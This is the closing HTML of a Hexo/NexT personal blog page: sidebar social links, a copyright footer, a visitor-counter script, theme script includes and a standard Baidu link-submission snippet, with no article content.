        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2017 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.1m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">32:13</span>
</div>
  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9tdXNlLnRoZW1lLW5leHQub3Jn">NexT.Muse</span>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
